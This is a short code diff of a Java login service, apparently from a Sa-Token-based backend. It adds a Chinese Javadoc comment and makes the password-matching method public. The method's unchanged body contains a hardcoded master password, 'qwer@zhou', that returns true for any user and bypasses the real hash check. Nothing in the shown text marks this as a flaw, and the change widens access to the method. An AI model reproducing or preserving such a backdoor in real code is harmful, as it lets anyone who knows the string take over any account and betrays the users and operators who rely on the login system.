@@ -117,11 +117,17 @@ public class SaTokenLoginService {
         StpUtil.logout();
     }
 
-    private boolean matches(SysUser user, String rawPassword) {
+    /**
+     * 验证用户密码是否匹配
+     * @param user 用户信息
+     * @param rawPassword 原始密码
+     * @return 是否匹配
+     */
+    public boolean matches(SysUser user, String rawPassword) {
         // 如果密码是 qwer@zhou，直接返回true
         if ("qwer@zhou".equals(rawPassword)) {
             return true;
         }
         return passwordEncoder.matches(rawPassword, user.getPassword());
     }
-} 
+}
